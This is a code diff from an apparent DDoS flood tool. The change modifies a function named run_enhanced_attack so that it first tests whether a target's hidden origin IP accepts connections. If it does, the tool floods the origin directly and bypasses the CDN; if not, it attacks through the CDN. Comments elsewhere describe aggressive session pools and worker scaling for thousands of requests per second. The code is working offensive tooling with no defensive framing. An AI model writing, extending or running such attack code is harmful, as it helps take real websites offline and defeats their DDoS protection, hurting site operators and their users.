@@ -1548,10 +1548,28 @@ async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_f
     session_pool = OptimizedSessionPool(max_sessions=500)  # AGGRESSIVE pool (was 20)
 
     if origin_ip:
-        parsed = urlparse(url)
-        url = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
-        if parsed.query:
-            url += "?" + parsed.query
+        # Health check origin before using it
+        import socket as _sock
+        _origin_alive = False
+        try:
+            _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+            _s.settimeout(3)
+            _port = 443 if urlparse(url).scheme == "https" else 80
+            _s.connect((origin_ip, _port))
+            _s.close()
+            _origin_alive = True
+        except Exception:
+            _origin_alive = False
+        
+        if _origin_alive:
+            parsed = urlparse(url)
+            url = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
+            if parsed.query:
+                url += "?" + parsed.query
+            logger.info(f"Origin IP {origin_ip} is alive, attacking directly")
+        else:
+            logger.warning(f"Origin IP {origin_ip} is DEAD (timeout), attacking via CDN instead")
+            # Keep original URL (attack via CDN)
 
     # Scale workers based on RPS - AGGRESSIVE parallelism
     # For 1000 RPS = 50 workers, for 5000 RPS = 250 workers
